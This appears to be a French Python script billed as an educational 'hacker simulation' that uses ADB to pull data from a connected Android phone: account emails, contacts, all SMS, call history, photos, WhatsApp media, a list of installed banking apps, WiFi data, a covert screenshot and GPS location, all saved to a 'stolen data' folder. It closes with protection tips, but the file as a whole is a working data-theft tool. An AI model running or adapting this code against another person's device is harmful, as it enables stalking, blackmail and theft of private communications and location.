#!/usr/bin/env python3
"""
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

🔴 EXTRACTION COMPLÈTE DE DONNÉES - SIMULATION HACKER
=====================================================
Tout ce qu'un hacker peut voler de ton téléphone en quelques minutes

⚠️  USAGE ÉDUCATIF UNIQUEMENT - SUR TON PROPRE APPAREIL
"""

import subprocess
import os
import sys
from datetime import datetime
import json

# ============== CONFIGURATION ==============
ADB = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
OUTPUT = r"C:\Users\davis\OneDrive\Bureau\HACKING\DONNEES_VOLEES"

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def adb(cmd, device=None):
    """Exécuter une commande ADB"""
    try:
        if device:
            full_cmd = f'"{ADB}" -s {device} {cmd}'
        else:
            full_cmd = f'"{ADB}" {cmd}'
        result = subprocess.run(full_cmd, shell=True, capture_output=True, 
                               text=True, timeout=60, encoding='utf-8', errors='replace')
        return result.stdout.strip()
    except:
        return ""

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Colors.RED}
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Colors.END}
    {Colors.YELLOW}📱 EXTRACTION COMPLÈTE DE DONNÉES - MODE HACKER{Colors.END}
    {Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}
    📅 Date: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
    📁 Sortie: {OUTPUT}
    """)

def section(title, icon="📌"):
    print(f"\n{Colors.CYAN}{'═'*70}{Colors.END}")
    print(f"{Colors.BOLD}{icon} {title}{Colors.END}")
    print(f"{Colors.CYAN}{'═'*70}{Colors.END}\n")

def success(msg):
    print(f"    {Colors.GREEN}✅ {msg}{Colors.END}")

def warning(msg):
    print(f"    {Colors.YELLOW}⚠️  {msg}{Colors.END}")

def error(msg):
    print(f"    {Colors.RED}❌ {msg}{Colors.END}")

def info(msg):
    print(f"    {Colors.BLUE}ℹ️  {msg}{Colors.END}")

def data(label, value):
    print(f"    {Colors.MAGENTA}{label}:{Colors.END} {value}")

def get_device():
    """Trouver l'appareil connecté"""
    result = adb("devices")
    for line in result.split("\n"):
        if "\tdevice" in line:
            return line.split("\t")[0]
    return None

def create_folders():
    """Créer les dossiers de sortie"""
    folders = ["", "Photos", "Videos", "WhatsApp", "Documents", 
               "SMS", "Contacts", "Appels", "Screenshots", "Apps"]
    for f in folders:
        os.makedirs(os.path.join(OUTPUT, f), exist_ok=True)

def extract_system_info(dev):
    """Extraire les infos système"""
    section("1️⃣  INFORMATIONS SYSTÈME", "🔧")
    
    info_dict = {}
    
    # Modèle
    model = adb("shell getprop ro.product.model", dev)
    info_dict['model'] = model
    data("📱 Modèle", model)
    
    # Marque
    brand = adb("shell getprop ro.product.brand", dev)
    info_dict['brand'] = brand
    data("🏷️  Marque", brand)
    
    # Android
    android = adb("shell getprop ro.build.version.release", dev)
    info_dict['android'] = android
    data("🤖 Android", android)
    
    # Série
    serial = adb("shell getprop ro.serialno", dev)
    info_dict['serial'] = serial
    data("🔢 N° Série", serial)
    
    # Hardware
    hw = adb("shell getprop ro.hardware", dev)
    info_dict['hardware'] = hw
    data("⚙️  Processeur", hw)
    
    # Écran
    screen = adb("shell wm size", dev).replace("Physical size: ", "")
    info_dict['screen'] = screen
    data("🖥️  Écran", screen)
    
    # Batterie
    bat = adb("shell dumpsys battery | grep level", dev)
    if bat:
        level = bat.split(":")[-1].strip()
        info_dict['battery'] = level
        data("🔋 Batterie", f"{level}%")
    
    # Stockage
    storage = adb("shell df -h /sdcard | tail -1", dev)
    if storage:
        parts = storage.split()
        if len(parts) >= 4:
            info_dict['storage'] = f"{parts[2]}/{parts[1]}"
            data("💾 Stockage", f"Utilisé: {parts[2]} / Total: {parts[1]}")
    
    # Sauvegarder
    with open(f"{OUTPUT}/system_info.json", "w") as f:
        json.dump(info_dict, f, indent=2)
    success(f"Sauvegardé: system_info.json")
    
    return info_dict

def extract_accounts(dev):
    """Extraire les comptes"""
    section("2️⃣  COMPTES CONNECTÉS", "👤")
    
    accounts_raw = adb("shell dumpsys account", dev)
    
    google_accounts = []
    print(f"    {Colors.RED}🔴 COMPTES GOOGLE:{Colors.END}")
    
    for line in accounts_raw.split("\n"):
        if "Account {" in line and "type=com.google" in line:
            start = line.find("name=") + 5
            end = line.find(",", start)
            if end > start:
                email = line[start:end]
                if "@" in email and email not in google_accounts:
                    google_accounts.append(email)
                    print(f"        📧 {Colors.YELLOW}{email}{Colors.END}")
    
    if not google_accounts:
        warning("Aucun compte Google trouvé (permissions limitées)")
    
    # Autres comptes
    print(f"\n    {Colors.RED}🔴 AUTRES COMPTES:{Colors.END}")
    other_types = ['com.whatsapp', 'com.facebook', 'com.instagram', 'com.tiktok']
    for acc_type in other_types:
        if acc_type in accounts_raw:
            name = acc_type.split('.')[-1].upper()
            print(f"        📱 {name}: CONNECTÉ")
    
    with open(f"{OUTPUT}/comptes.txt", "w", encoding="utf-8") as f:
        f.write("=== COMPTES GOOGLE ===\n")
        f.write("\n".join(google_accounts))
        f.write("\n\n=== DUMP COMPLET ===\n")
        f.write(accounts_raw[:5000])
    
    success(f"Sauvegardé: comptes.txt")
    return google_accounts

def extract_contacts(dev):
    """Extraire les contacts"""
    section("3️⃣  CONTACTS", "📇")
    
    contacts = adb("shell content query --uri content://contacts/phones", dev)
    
    count = contacts.count("Row:")
    
    print(f"    {Colors.RED}🔴 CONTACTS TROUVÉS: {count}{Colors.END}\n")
    
    # Afficher les premiers
    lines = contacts.split("\n")
    displayed = 0
    for line in lines:
        if "display_name=" in line and displayed < 15:
            # Extraire le nom
            name_start = line.find("display_name=") + 13
            name_end = line.find(",", name_start)
            name = line[name_start:name_end] if name_end > name_start else line[name_start:name_start+30]
            
            # Extraire le numéro
            num_start = line.find("number=")
            if num_start > 0:
                num_start += 7
                num_end = line.find(",", num_start)
                number = line[num_start:num_end] if num_end > num_start else line[num_start:num_start+20]
            else:
                number = "N/A"
            
            print(f"        👤 {name[:25]:<25} 📞 {number}")
            displayed += 1
    
    if count > 15:
        print(f"\n        ... et {count - 15} autres contacts")
    
    with open(f"{OUTPUT}/Contacts/contacts_complet.txt", "w", encoding="utf-8") as f:
        f.write(contacts)
    
    success(f"Sauvegardé: Contacts/contacts_complet.txt ({count} contacts)")
    return count

def extract_sms(dev):
    """Extraire les SMS"""
    section("4️⃣  MESSAGES SMS", "💬")
    
    # Récupérer les SMS récents
    sms = adb('shell content query --uri content://sms --projection "address,body,date,type" --sort "date DESC"', dev)
    
    count = sms.count("Row:")
    
    print(f"    {Colors.RED}🔴 SMS TROUVÉS: {count}{Colors.END}\n")
    
    # Afficher les derniers
    lines = sms.split("Row:")
    displayed = 0
    
    for row in lines[1:11]:  # 10 premiers
        # Extraire adresse
        addr_match = row.find("address=")
        if addr_match >= 0:
            addr_start = addr_match + 8
            addr_end = row.find(",", addr_start)
            address = row[addr_start:addr_end] if addr_end > addr_start else "?"
            
            # Extraire body
            body_match = row.find("body=")
            if body_match >= 0:
                body_start = body_match + 5
                body_end = row.find(", date=", body_start)
                body = row[body_start:body_end] if body_end > body_start else row[body_start:body_start+50]
                body = body[:50] + "..." if len(body) > 50 else body
                
                displayed += 1
                print(f"        💬 De: {address[:15]:<15}")
                print(f"           \"{body}\"")
                print()
    
    with open(f"{OUTPUT}/SMS/sms_complet.txt", "w", encoding="utf-8") as f:
        f.write(sms)
    
    success(f"Sauvegardé: SMS/sms_complet.txt ({count} messages)")
    return count

def extract_calls(dev):
    """Extraire l'historique des appels"""
    section("5️⃣  HISTORIQUE APPELS", "📞")
    
    calls = adb('shell content query --uri content://call_log/calls --projection "number,name,duration,date,type"', dev)
    
    count = calls.count("Row:")
    
    print(f"    {Colors.RED}🔴 APPELS TROUVÉS: {count}{Colors.END}\n")
    
    # Afficher les derniers
    rows = calls.split("Row:")
    
    for row in rows[1:11]:
        # Numéro
        num_match = row.find("number=")
        if num_match >= 0:
            num_start = num_match + 7
            num_end = row.find(",", num_start)
            number = row[num_start:num_end] if num_end > num_start else "?"
            
            # Nom
            name_match = row.find("name=")
            if name_match >= 0:
                name_start = name_match + 5
                name_end = row.find(",", name_start)
                name = row[name_start:name_end] if name_end > name_start else ""
            else:
                name = ""
            
            # Durée
            dur_match = row.find("duration=")
            if dur_match >= 0:
                dur_start = dur_match + 9
                dur_end = row.find(",", dur_start)
                duration = row[dur_start:dur_end] if dur_end > dur_start else "0"
            else:
                duration = "0"
            
            # Type
            type_match = row.find("type=")
            if type_match >= 0:
                call_type = row[type_match+5:type_match+6]
                type_icon = "📥" if call_type == "1" else "📤" if call_type == "2" else "❌"
            else:
                type_icon = "📞"
            
            display_name = f"{name} ({number})" if name and name != "NULL" else number
            print(f"        {type_icon} {display_name[:30]:<30} ⏱️ {duration}s")
    
    with open(f"{OUTPUT}/Appels/appels_complet.txt", "w", encoding="utf-8") as f:
        f.write(calls)
    
    success(f"Sauvegardé: Appels/appels_complet.txt ({count} appels)")
    return count

def extract_photos(dev):
    """Extraire les photos"""
    section("6️⃣  PHOTOS", "📷")
    
    # Lister DCIM
    photos = adb("shell ls -la /sdcard/DCIM/Camera/", dev)
    
    photo_list = []
    print(f"    {Colors.RED}🔴 PHOTOS DANS DCIM/Camera:{Colors.END}\n")
    
    for line in photos.split("\n"):
        if ".jpg" in line.lower() or ".png" in line.lower() or ".jpeg" in line.lower():
            parts = line.split()
            if len(parts) >= 5:
                size = parts[4]
                name = parts[-1]
                photo_list.append(name)
                if len(photo_list) <= 10:
                    print(f"        📷 {name:<40} ({size} bytes)")
    
    if len(photo_list) > 10:
        print(f"\n        ... et {len(photo_list) - 10} autres photos")
    
    print(f"\n    📊 Total photos Camera: {len(photo_list)}")
    
    # Compter toutes les images
    all_jpg = adb("shell find /sdcard -name '*.jpg' 2>/dev/null | wc -l", dev)
    all_png = adb("shell find /sdcard -name '*.png' 2>/dev/null | wc -l", dev)
    
    try:
        total_img = int(all_jpg) + int(all_png)
        print(f"    📊 {Colors.YELLOW}TOTAL IMAGES SUR TÉLÉPHONE: {total_img}{Colors.END}")
    except:
        pass
    
    # Télécharger des échantillons
    print(f"\n    ⬇️  Téléchargement de 3 photos...")
    downloaded = 0
    for photo in photo_list[:3]:
        result = adb(f'pull "/sdcard/DCIM/Camera/{photo}" "{OUTPUT}/Photos/{photo}"', dev)
        if os.path.exists(f"{OUTPUT}/Photos/{photo}"):
            downloaded += 1
            success(f"Téléchargée: {photo}")
    
    return len(photo_list)

def extract_whatsapp(dev):
    """Extraire WhatsApp"""
    section("7️⃣  WHATSAPP", "📱")
    
    wa_base = "/sdcard/Android/media/com.whatsapp/WhatsApp/Media"
    
    # Images
    wa_img = adb(f'shell ls "{wa_base}/WhatsApp Images/" 2>/dev/null', dev)
    img_count = len([l for l in wa_img.split("\n") if l.strip() and not l.startswith("ls:")])
    
    # Sent
    wa_sent = adb(f'shell ls "{wa_base}/WhatsApp Images/Sent/" 2>/dev/null', dev)
    sent_count = len([l for l in wa_sent.split("\n") if l.strip() and not l.startswith("ls:")])
    
    # Videos
    wa_vid = adb(f'shell ls "{wa_base}/WhatsApp Video/" 2>/dev/null', dev)
    vid_count = len([l for l in wa_vid.split("\n") if l.strip() and not l.startswith("ls:")])
    
    # Voice
    wa_voice = adb(f'shell ls "{wa_base}/WhatsApp Voice Notes/" 2>/dev/null | head -20', dev)
    voice_count = len([l for l in wa_voice.split("\n") if l.strip() and not l.startswith("ls:")])
    
    # Documents
    wa_docs = adb(f'shell ls "{wa_base}/WhatsApp Documents/" 2>/dev/null', dev)
    docs_count = len([l for l in wa_docs.split("\n") if l.strip() and not l.startswith("ls:")])
    
    print(f"""
    {Colors.RED}🔴 DONNÉES WHATSAPP TROUVÉES:{Colors.END}
    
        📷 Images reçues:     {Colors.YELLOW}{img_count}{Colors.END}
        📤 Images envoyées:   {Colors.YELLOW}{sent_count}{Colors.END}
        🎥 Vidéos:            {Colors.YELLOW}{vid_count}{Colors.END}
        🎵 Notes vocales:     {Colors.YELLOW}{voice_count}{Colors.END}
        📄 Documents:         {Colors.YELLOW}{docs_count}{Colors.END}
        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        📊 TOTAL:             {Colors.RED}{img_count + sent_count + vid_count + voice_count + docs_count}{Colors.END}
    """)
    
    # Télécharger des échantillons
    print(f"    ⬇️  Téléchargement d'images WhatsApp...")
    
    images_list = adb(f'shell ls "{wa_base}/WhatsApp Images/Sent/" 2>/dev/null | head -3', dev)
    for img in images_list.split("\n")[:3]:
        if img.strip() and ".jpg" in img.lower():
            adb(f'pull "{wa_base}/WhatsApp Images/Sent/{img.strip()}" "{OUTPUT}/WhatsApp/{img.strip()}"', dev)
            if os.path.exists(f"{OUTPUT}/WhatsApp/{img.strip()}"):
                success(f"Téléchargée: {img.strip()}")
    
    return img_count + sent_count + vid_count

def extract_apps(dev):
    """Extraire les applications"""
    section("8️⃣  APPLICATIONS INSTALLÉES", "📲")
    
    apps = adb("shell pm list packages -3", dev)
    
    app_list = []
    banking = []
    social = []
    security = []
    
    kw_bank = ['bank', 'pay', 'money', 'wallet', 'cash', 'wave', 'orange', 'momo', 'credit']
    kw_social = ['whatsapp', 'facebook', 'instagram', 'tiktok', 'telegram', 'snapchat', 'twitter', 'signal']
    kw_secure = ['password', 'auth', 'secure', 'key', 'vault', 'lock', 'vpn']
    
    for line in apps.split("\n"):
        if "package:" in line:
            pkg = line.replace("package:", "").strip()
            app_list.append(pkg)
            
            pkg_lower = pkg.lower()
            for kw in kw_bank:
                if kw in pkg_lower:
                    banking.append(pkg)
                    break
            for kw in kw_social:
                if kw in pkg_lower:
                    social.append(pkg)
                    break
            for kw in kw_secure:
                if kw in pkg_lower:
                    security.append(pkg)
                    break
    
    print(f"    {Colors.RED}🔴 APPLICATIONS BANCAIRES/PAIEMENT ({len(banking)}):{Colors.END}")
    for app in banking:
        print(f"        💳 {app}")
    
    print(f"\n    {Colors.RED}🔴 APPLICATIONS SOCIALES ({len(social)}):{Colors.END}")
    for app in social:
        print(f"        💬 {app}")
    
    print(f"\n    {Colors.RED}🔴 APPLICATIONS SÉCURITÉ ({len(security)}):{Colors.END}")
    for app in security:
        print(f"        🔐 {app}")
    
    print(f"\n    📊 {Colors.YELLOW}TOTAL APPS: {len(app_list)}{Colors.END}")
    
    with open(f"{OUTPUT}/Apps/applications.txt", "w") as f:
        f.write(f"=== APPS BANCAIRES ({len(banking)}) ===\n")
        f.write("\n".join(banking))
        f.write(f"\n\n=== APPS SOCIALES ({len(social)}) ===\n")
        f.write("\n".join(social))
        f.write(f"\n\n=== TOUTES LES APPS ({len(app_list)}) ===\n")
        f.write("\n".join(sorted(app_list)))
    
    success(f"Sauvegardé: Apps/applications.txt")
    return len(app_list)

def extract_wifi(dev):
    """Extraire les infos WiFi"""
    section("9️⃣  RÉSEAUX WIFI", "📶")
    
    wifi = adb("shell dumpsys wifi | head -100", dev)
    
    print(f"    {Colors.RED}🔴 INFORMATIONS WIFI:{Colors.END}\n")
    
    for line in wifi.split("\n"):
        if "SSID" in line or "mWifiInfo" in line or "NetworkId" in line:
            clean = line.strip()[:60]
            print(f"        📶 {clean}")
    
    with open(f"{OUTPUT}/wifi_dump.txt", "w") as f:
        f.write(wifi)
    
    warning("Avec ROOT, un hacker verrait aussi les MOTS DE PASSE!")
    success("Sauvegardé: wifi_dump.txt")

def take_screenshot(dev):
    """Prendre une capture d'écran"""
    section("🔟 CAPTURE D'ÉCRAN SECRÈTE", "📸")
    
    print("    📸 Capture de l'écran en cours...")
    
    adb("shell screencap -p /sdcard/hack_screen.png", dev)
    adb(f'pull /sdcard/hack_screen.png "{OUTPUT}/Screenshots/capture_{datetime.now().strftime("%H%M%S")}.png"', dev)
    adb("shell rm /sdcard/hack_screen.png", dev)
    
    screenshot_path = f"{OUTPUT}/Screenshots/"
    files = os.listdir(screenshot_path) if os.path.exists(screenshot_path) else []
    
    if files:
        success(f"Screenshot capturé: {files[-1]}")
        size = os.path.getsize(os.path.join(screenshot_path, files[-1]))
        info(f"Taille: {size:,} bytes")
    else:
        error("Échec de la capture")

def extract_location(dev):
    """Obtenir la localisation"""
    section("1️⃣1️⃣ LOCALISATION GPS", "📍")
    
    location = adb("shell dumpsys location | head -50", dev)
    
    print(f"    {Colors.RED}🔴 DONNÉES DE LOCALISATION:{Colors.END}\n")
    
    for line in location.split("\n"):
        if "last location" in line.lower() or "latitude" in line.lower() or "Location[" in line:
            print(f"        📍 {line.strip()[:65]}")
    
    with open(f"{OUTPUT}/localisation.txt", "w") as f:
        f.write(adb("shell dumpsys location", dev))
    
    warning("Un hacker peut suivre TOUS tes déplacements!")
    success("Sauvegardé: localisation.txt")

def final_report(stats):
    """Rapport final"""
    section("📊 RAPPORT FINAL D'EXTRACTION", "🔴")
    
    # Compter les fichiers
    total_files = sum([len(files) for _, _, files in os.walk(OUTPUT)])
    total_size = sum([os.path.getsize(os.path.join(root, f)) 
                      for root, _, files in os.walk(OUTPUT) for f in files])
    
    print(f"""
    {Colors.RED}╔══════════════════════════════════════════════════════════════════╗
    ║               🔴 DONNÉES VOLÉES AVEC SUCCÈS 🔴                ║
    ╠══════════════════════════════════════════════════════════════════╣{Colors.END}
    ║                                                                  ║
    ║   📱 Téléphone: {stats.get('model', 'N/A'):<46}║
    ║   🤖 Android: {stats.get('android', 'N/A'):<48}║
    ║                                                                  ║
    ║   📇 Contacts:        {Colors.YELLOW}{stats.get('contacts', 0):<43}{Colors.END}║
    ║   💬 SMS:             {Colors.YELLOW}{stats.get('sms', 0):<43}{Colors.END}║
    ║   📞 Appels:          {Colors.YELLOW}{stats.get('calls', 0):<43}{Colors.END}║
    ║   📷 Photos:          {Colors.YELLOW}{stats.get('photos', 0):<43}{Colors.END}║
    ║   📱 WhatsApp:        {Colors.YELLOW}{stats.get('whatsapp', 0):<43}{Colors.END}║
    ║   📲 Applications:    {Colors.YELLOW}{stats.get('apps', 0):<43}{Colors.END}║
    ║                                                                  ║
    ║   💾 Fichiers sauvés: {total_files:<43}║
    ║   📁 Taille totale:   {total_size:,} bytes{' '*27}║
    ║                                                                  ║
    {Colors.RED}╚══════════════════════════════════════════════════════════════════╝{Colors.END}
    """)
    
    print(f"""
    {Colors.RED}🚨🚨🚨 CE QU'UN HACKER PEUT FAIRE AVEC CES DONNÉES 🚨🚨🚨{Colors.END}
    
    {Colors.YELLOW}❌ Usurper ton identité{Colors.END}
    {Colors.YELLOW}❌ Accéder à tes comptes bancaires{Colors.END}
    {Colors.YELLOW}❌ Lire TOUS tes messages privés{Colors.END}
    {Colors.YELLOW}❌ Te faire chanter avec tes photos{Colors.END}
    {Colors.YELLOW}❌ Suivre tes déplacements{Colors.END}
    {Colors.YELLOW}❌ Arnaquer tes contacts{Colors.END}
    {Colors.YELLOW}❌ Voler tes mots de passe{Colors.END}
    
    {Colors.GREEN}🛡️ COMMENT TE PROTÉGER:{Colors.END}
    
    ✅ Désactive le débogage USB MAINTENANT
    ✅ Ne connecte jamais ton tel à un PC inconnu
    ✅ Active le chiffrement du téléphone
    ✅ Utilise un mot de passe fort
    ✅ Active l'authentification à 2 facteurs
    """)
    
    # Ouvrir le dossier
    print(f"\n    📂 Ouverture du dossier des données volées...")
    try:
        os.startfile(OUTPUT)
    except:
        pass

def main():
    banner()
    create_folders()
    
    print("🔍 Recherche du téléphone...")
    device = get_device()
    
    if not device:
        print(f"""
    {Colors.RED}❌ AUCUN TÉLÉPHONE CONNECTÉ!{Colors.END}
    
    Pour connecter ton téléphone:
    
    📱 Via USB:
       1. Branche le câble USB
       2. Accepte "Autoriser le débogage USB" sur le téléphone
    
    📶 Via WiFi:
       1. Paramètres → Options développeur → Débogage WiFi
       2. Appuie sur "Associer l'appareil avec un code"
       3. Lance: adb pair IP:PORT CODE
       4. Puis: adb connect IP:PORT
        """)
        return
    
    print(f"    {Colors.GREEN}✅ Téléphone trouvé: {device}{Colors.END}")
    print(f"\n    {Colors.RED}⚠️  EXTRACTION EN COURS... NE TOUCHE PAS AU TÉLÉPHONE!{Colors.END}\n")
    
    # Collecter les stats
    stats = {}
    
    # Extraire tout
    sys_info = extract_system_info(device)
    stats['model'] = sys_info.get('model', 'N/A')
    stats['android'] = sys_info.get('android', 'N/A')
    
    extract_accounts(device)
    stats['contacts'] = extract_contacts(device)
    stats['sms'] = extract_sms(device)
    stats['calls'] = extract_calls(device)
    stats['photos'] = extract_photos(device)
    stats['whatsapp'] = extract_whatsapp(device)
    stats['apps'] = extract_apps(device)
    extract_wifi(device)
    take_screenshot(device)
    extract_location(device)
    
    final_report(stats)
    
    print(f"\n{Colors.GREEN}{'═'*70}")
    print("✅ EXTRACTION TERMINÉE!")
    print(f"{'═'*70}{Colors.END}")

if __name__ == "__main__":
    main()
